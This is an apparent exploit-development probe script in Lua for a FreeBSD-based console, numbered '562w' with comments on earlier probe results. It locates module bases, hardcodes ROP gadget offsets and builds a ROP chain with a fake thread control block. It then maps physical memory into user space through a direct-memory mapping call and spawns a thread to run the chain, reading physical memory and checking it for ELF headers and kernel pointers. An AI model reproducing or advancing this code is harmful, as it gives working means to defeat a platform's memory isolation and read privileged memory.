-- CRASH_CLASS: MODERATE
-- PROBE 562w: Pre-build everything, MapDM last, spawn immediately
--
-- 562u: heap stack, no MapDM → CLEAN ✓
-- 562v: heap stack, MapDM then chain build → TRACE ✗
--
-- KEY INSIGHT: After MapDM, even heap writes trigger trace.
-- But MapDM itself returns cleanly (rv=0, no trace, no death).
-- And fn_addr syscalls work after MapDM (562p/562q).
--
-- PLAN: ZERO writes after MapDM.
-- 1. Build chain on heap (references mapped_va=0x880000000 as constant)
-- 2. Build thr_param on heap
-- 3. Reserve VA via fn_addr mmap (syscall, not Lua write)
-- 4. MapDM phys → reserved VA
-- 5. Spawn child immediately (mk(455) — syscall, no write)
-- 6. Poll sentinel (rb — read only)
-- 7. Print results

print("=== PROBE 562w: PREBUILT + MAPDM + SPAWN ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rb(a)
    local d = rd(a); if d == nil then return nil end
    if d < 0 then d = d + 0x100000000 end; return d
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end

local Z = uint64(0)
local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)

-- Module bases
local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(Z, ib) end)
local elo = rd(N(ib) + 0x108) or 0; local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))

wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0x2001), ib) end)
local llo = rd(N(ib) + 0x108) or 0; local lhi = rd(N(ib) + 0x10C) or 0
if llo < 0 then llo = llo + 0x100000000 end
if lhi < 0 then lhi = lhi + 0x100000000 end
local lk = uint64(string.format("0x%X%08X", lhi, llo))
local mapdm_fn = lk + uint64(0x15020)

print(string.format("eb=0x%X%08X lk=0x%X%08X", ehi, elo, lhi, llo))

local g_pop_rax = eb + 0x992
local g_pop_rdi = eb + 0xC9DFE
local g_pop_rsi = eb + 0xD77D
local g_bare_ret = eb + 0x42
local g_mov_m_rax = eb + 0x92C67
local g_mov_rax_m = eb + 0x1A5CC4
io.flush()

-- ============================================================
-- [A] PRE-BUILD: shared buf, TCB, chain, thr_param — ALL on heap
-- ============================================================
print("[A] pre-building everything on HEAP")

local mapped_va = uint64("0x880000000")

-- Shared buffer
local shared = memory.alloc(0x80)
local sh = N(shared)
for i = 0, 0x7C, 4 do wd(sh + i, 0) end

-- Fake TCB
local tcb = memory.alloc(0x1000)
for i = 0, 0xFFC, 4 do wd(N(tcb) + i, 0) end
wq(N(tcb), uint64(N(tcb)))
local fsb = memory.alloc(8)
wq(N(fsb), uint64(N(tcb)))

-- Heap stack
local ss = 0x4000
local stack_buf = memory.alloc(ss)
local sb = N(stack_buf)
local rsp = sb + ss - ((sb + ss) % 16) - 8

-- Build chain
local off = 0
local function emit(v) wq(rsp + off, v); off = off + 8 end

-- sysarch(SET_FSBASE=129)
emit(g_pop_rdi); emit(uint64(129))
emit(g_pop_rsi); emit(uint64(N(fsb)))
emit(g_pop_rax); emit(uint64(165))
emit(stub)

-- Read 4 qwords from mapped_va → shared+0x10..0x28
for qi = 0, 3 do
    emit(g_pop_rsi); emit(mapped_va + uint64(qi * 8))
    emit(g_mov_rax_m)
    emit(g_pop_rdi); emit(uint64(sh + 0x10 + qi * 8))
    emit(g_mov_m_rax)
end

-- Sentinel
emit(g_pop_rax); emit(uint64("0xDEADFACECAFEBABE"))
emit(g_pop_rdi); emit(uint64(sh))
emit(g_mov_m_rax)

-- thr_exit(0)
emit(g_pop_rdi); emit(Z)
emit(g_pop_rax); emit(uint64(431))
emit(stub)

-- thr_param
local pa = memory.alloc(0x40)
for i = 0, 0x3C, 4 do wd(N(pa) + i, 0) end
wq(N(pa), g_bare_ret)
wq(N(pa) + 0x10, uint64(sb))
wq(N(pa) + 0x18, uint64(ss))
local tid_buf = memory.alloc(8); wq(N(tid_buf), Z)
wq(N(pa) + 0x30, tid_buf)

print(string.format("  chain=%d entries, rsp=0x%X", off/8, rsp))
io.flush()

-- ============================================================
-- [B] MapDM: reserve VA + map physical memory
-- NO MORE WRITES AFTER THIS POINT
-- ============================================================
print("[B] MapDM phys 0x100000000")
io.flush()

-- Reserve VA via fn_addr (syscall, not Lua write)
pcall(function()
    native.fcall_with_rax(stub, 477,
        mapped_va, uint64(0x4000), uint64(3),
        uint64(0x1012), uint64(0xFFFFFFFF), Z)
end)

-- MapDirectMemory
local ok_md, rv_md = pcall(function()
    return native.fcall_with_rax(mapdm_fn, 0,
        mapped_va, uint64(0x4000), uint64(3), Z,
        uint64("0x100000000"), uint64(0x4000))
end)
local md_rv = ok_md and N(rv_md) or -999
print("rv=" .. md_rv)
if md_rv ~= 0 then
    print("MAPDM_FAILED")
    print("=== 562w DONE ===")
    return
end
io.flush()

-- ============================================================
-- [C] Spawn child IMMEDIATELY — zero writes between MapDM and here
-- ============================================================
print("[C] spawn")
io.flush()
local ok_s, rv_s = pcall(function() return mk(455)(pa, uint64(0x38)) end)
print("ret=" .. (ok_s and N(rv_s) or -999))
io.flush()

-- ============================================================
-- [D] Poll sentinel (reads only)
-- ============================================================
local found = false
local found_iter = 0
for i = 1, 2000000 do
    local sv = rb(sh)
    if sv and sv == 0xDEADFACE then
        found = true
        found_iter = i
        break
    end
end

-- ============================================================
-- [E] Results
-- ============================================================
print("")
if found then
    print("SENTINEL_FOUND iter=" .. found_iter)
    for qi = 0, 3 do
        local lo = rb(sh + 0x10 + qi * 8) or 0
        local hi = rb(sh + 0x14 + qi * 8) or 0
        local tag = ""
        if lo == 0x464C457F then tag = " *** ELF MAGIC ***" end
        if hi >= 0xFFFF8000 and hi < 0xFFFFFFFF then tag = tag .. " KPTR?" end
        print(string.format("phys+0x%02X = 0x%08X_%08X%s", qi*8, hi, lo, tag))
    end
else
    print("SENTINEL_NOT_FOUND")
    local sv = rb(sh) or 0
    print(string.format("sentinel_raw=0x%08X", sv))
    for qi = 0, 3 do
        local lo = rb(sh + 0x10 + qi * 8) or 0
        local hi = rb(sh + 0x14 + qi * 8) or 0
        print(string.format("phys+0x%02X = 0x%08X_%08X (unconfirmed)", qi*8, hi, lo))
    end
end

io.flush()
local pid2 = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid2 .. (pid2 == pid_val and " ALIVE" or " DEAD"))
print("=== 562w DONE ===")
